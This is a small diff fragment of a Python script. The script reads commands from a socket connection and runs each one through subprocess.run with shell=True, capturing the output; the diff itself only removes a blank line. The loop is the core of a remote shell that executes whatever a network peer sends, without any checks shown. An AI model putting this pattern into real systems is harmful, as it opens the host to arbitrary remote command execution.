@@ -34,7 +34,6 @@ conn.sendall(welcome_msg.encode())
 while True: 
 	recv_command = conn.recv(2048) # Command must be < 2048 char
 	print(f"$ {recv_command.decode()}")
-
 	call = subprocess.run(recv_command.decode(), shell=True, capture_output=True)
 	output = call.stdout.decode()
 	error = call.stderr.decode()
